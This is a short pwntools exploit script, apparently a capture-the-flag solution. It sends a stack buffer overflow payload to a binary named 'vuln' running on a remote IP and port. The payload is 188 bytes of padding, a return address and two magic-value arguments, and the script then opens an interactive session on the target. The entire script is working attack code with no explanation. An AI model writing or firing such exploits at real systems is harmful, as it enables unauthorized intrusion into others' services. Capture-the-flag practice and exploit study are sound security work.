from pwn import *
p=process('./vuln')
p=remote('94.237.48.12',54593)
payload=b'a'*188+p32(0x80491e2)+p32(0)+p32(-0x21524111&0xffffffff)+p32(-0x3f212ff3&0xffffffff)
p.sendline(payload)
p.interactive()
